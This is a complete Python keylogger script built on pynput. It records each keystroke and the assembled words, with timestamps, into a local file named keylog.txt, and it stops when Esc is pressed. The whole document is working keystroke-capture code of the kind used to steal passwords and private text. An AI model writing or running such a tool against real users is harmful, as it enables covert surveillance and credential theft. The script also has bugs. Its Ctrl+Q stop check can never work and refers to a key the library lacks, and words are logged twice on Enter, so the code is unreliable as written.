from pynput.keyboard import Listener, Key
import logging

# Set up logging to capture keystrokes and save them to a file
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Lists to track current word and pressed key combinations
current_keys = []
pressed_keys = []

# Function to log each key pressed
def on_press(key):
    try:
        # If the key is a printable character (e.g. letters or numbers)
        if hasattr(key, 'char') and key.char:
            current_keys.append(key.char)  # Add character to current word
            logging.info(f"Key {key.char} pressed")

        # Handle special keys like space, enter, and backspace
        else:
            handle_special_keys(key)

    except AttributeError:
        # If the key is a special function key (like Shift or Ctrl)
        logging.info(f"Special key {key} pressed")

# Function to handle special keys
def handle_special_keys(key):
    if key == Key.space:
        current_keys.append(" ")  # Add space to the word
        logging.info("Space pressed")
    elif key == Key.enter:
        current_keys.append("\n")  # Add newline (end of word)
        log_word()  # Log word when Enter is pressed
        logging.info("Enter pressed")
    elif key == Key.backspace:
        current_keys.append("<Backspace>")
        logging.info("Backspace pressed")
    elif key in [Key.shift, Key.shift_r]:
        pressed_keys.append('Shift')
        logging.info("Shift key pressed")
    elif key in [Key.ctrl_l, Key.ctrl_r]:
        pressed_keys.append('Ctrl')
        logging.info("Ctrl key pressed")
    elif key in [Key.alt_l, Key.alt_r]:
        pressed_keys.append('Alt')
        logging.info("Alt key pressed")
    elif key == Key.caps_lock:
        logging.info("Caps Lock toggled")
    else:
        logging.info(f"Special key {key} pressed")

# Function to log a completed word when Enter key is pressed
def log_word():
    word = ''.join(current_keys).strip()  # Join characters to form a word
    if word:  # Only log non-empty words
        logging.info(f"Word logged: {word}")
    current_keys.clear()  # Clear current keys for the next word

# Function to stop the listener when 'Esc' or 'Ctrl + Q' is pressed
def on_release(key):
    if key == Key.esc:  # Escape key stops the listener
        return False
    if Key.ctrl_l in pressed_keys and key == Key.q:  # Ctrl + Q stops the listener
        logging.info("Ctrl + Q pressed, stopping the keylogger.")
        return False
    if key == Key.enter:  # Log word when Enter key is pressed
        log_word()

# Start the listener to capture keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
